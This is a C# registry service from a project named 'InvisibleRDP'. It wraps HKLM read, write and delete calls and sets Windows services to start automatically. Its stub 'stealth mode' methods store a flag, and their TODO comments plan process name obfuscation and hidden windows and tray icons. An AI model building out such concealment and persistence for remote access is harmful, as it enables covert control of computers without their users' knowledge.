using System;
using System.Threading.Tasks;
using Microsoft.Win32;
using InvisibleRDP.Core.Interfaces;

namespace InvisibleRDP.Core.Services
{
    /// <summary>
    /// Service for Windows Registry operations.
    /// Note: This implementation uses Task.Run to make synchronous Registry operations async.
    /// On non-Windows platforms, operations will gracefully fail.
    /// </summary>
    public class RegistryService : IRegistryService
    {
        private const string ServiceRegistryPath = @"SYSTEM\CurrentControlSet\Services";
        private const string AppRegistryPath = @"SOFTWARE\InvisibleRDP";

        public Task<string?> ReadStringAsync(string keyPath, string valueName)
        {
            return Task.Run(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath, false);
                    return key?.GetValue(valueName)?.ToString();
                }
                catch
                {
                    return null;
                }
            });
        }

        public Task<bool> WriteStringAsync(string keyPath, string valueName, string value)
        {
            return Task.Run(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.CreateSubKey(keyPath, true);
                    if (key != null)
                    {
                        key.SetValue(valueName, value, RegistryValueKind.String);
                        return true;
                    }
                    return false;
                }
                catch
                {
                    return false;
                }
            });
        }

        public Task<int?> ReadIntAsync(string keyPath, string valueName)
        {
            return Task.Run<int?>(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath, false);
                    var value = key?.GetValue(valueName);
                    return value != null ? (int?)Convert.ToInt32(value) : null;
                }
                catch
                {
                    return null;
                }
            });
        }

        public Task<bool> WriteIntAsync(string keyPath, string valueName, int value)
        {
            return Task.Run(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.CreateSubKey(keyPath, true);
                    if (key != null)
                    {
                        key.SetValue(valueName, value, RegistryValueKind.DWord);
                        return true;
                    }
                    return false;
                }
                catch
                {
                    return false;
                }
            });
        }

        public Task<bool> DeleteValueAsync(string keyPath, string valueName)
        {
            return Task.Run(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath, true);
                    if (key != null)
                    {
                        key.DeleteValue(valueName, false);
                        return true;
                    }
                    return false;
                }
                catch
                {
                    return false;
                }
            });
        }

        public Task<bool> DeleteKeyAsync(string keyPath)
        {
            return Task.Run(() =>
            {
                try
                {
                    Registry.LocalMachine.DeleteSubKeyTree(keyPath, false);
                    return true;
                }
                catch
                {
                    return false;
                }
            });
        }

        public Task<bool> KeyExistsAsync(string keyPath)
        {
            return Task.Run(() =>
            {
                try
                {
                    using var key = Registry.LocalMachine.OpenSubKey(keyPath, false);
                    return key != null;
                }
                catch
                {
                    return false;
                }
            });
        }

        public async Task<bool> ConfigureAutoStartAsync(string serviceName)
        {
            var servicePath = $@"{ServiceRegistryPath}\{serviceName}";
            
            // Set service to start automatically
            return await WriteIntAsync(servicePath, "Start", 2); // 2 = Automatic start
        }

        public async Task<bool> RemoveAutoStartAsync(string serviceName)
        {
            var servicePath = $@"{ServiceRegistryPath}\{serviceName}";
            
            // Set service to manual start or delete
            return await WriteIntAsync(servicePath, "Start", 3); // 3 = Manual start
        }

        /// <summary>
        /// Gets the application's registry key path.
        /// </summary>
        public static string GetAppRegistryPath() => AppRegistryPath;

        /// <summary>
        /// Stub: Configure stealth mode settings in registry.
        /// </summary>
        public async Task<bool> ConfigureStealthModeAsync(bool enabled)
        {
            // TODO: Configure process name obfuscation
            // TODO: Set window visibility flags
            // TODO: Configure system tray icon visibility
            
            return await WriteIntAsync(AppRegistryPath, "StealthMode", enabled ? 1 : 0);
        }

        /// <summary>
        /// Stub: Read stealth mode configuration.
        /// </summary>
        public async Task<bool> IsStealthModeEnabledAsync()
        {
            var value = await ReadIntAsync(AppRegistryPath, "StealthMode");
            return value == 1;
        }
    }
}
